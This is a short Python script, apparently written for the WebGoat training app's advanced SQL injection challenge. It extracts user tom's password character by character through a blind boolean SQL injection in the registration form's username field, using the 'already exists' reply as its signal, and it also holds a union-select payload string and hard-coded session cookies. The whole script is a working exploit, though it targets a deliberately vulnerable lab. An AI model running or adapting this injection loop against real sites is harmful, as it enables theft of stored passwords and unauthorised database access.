# -*- coding:utf-8 -*-

import requests
from string import printable
chars = printable


vul_url = "http://192.168.120.139:30001/WebGoat/SqlInjectionAdvanced/challenge"
data1 = "username_reg=tomx'+union+select+password+from+sql_challenge_users+where+userid%3D'teom'--+-&email_reg=7702%40qq.com&password_reg=123&confirm_password_reg=123"
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-Requested-With': 'XMLHttpRequest'
}
cookies = {
    'JSESSIONID': 'Cjv__1CmPXojnPpkbSZ2Dqwwm-h-7IkqEDQ_MZLG',
    'JSESSIONID.75fbd09e': '7mc1x9iei6ji4xo2a3u4kbz1'
}
i = 0
result = ""
proxy={"http": "http://192.168.120.139:30001"}
while True:
    i += 1
    temp = result
    for char in chars:
        data = "username_reg=tom'+and substr(password, {0},1)='{1}'--+-&email_reg=7702%40qq.com&password_reg=123&confirm_password_reg=123".format(i, char)
        resp = requests.put(vul_url, data=data, headers=headers, cookies=cookies, proxies=proxy)
        # print(resp.text)
        if 'already exists' in resp.text:
            result += char
    print(result)
    if temp == result:
        break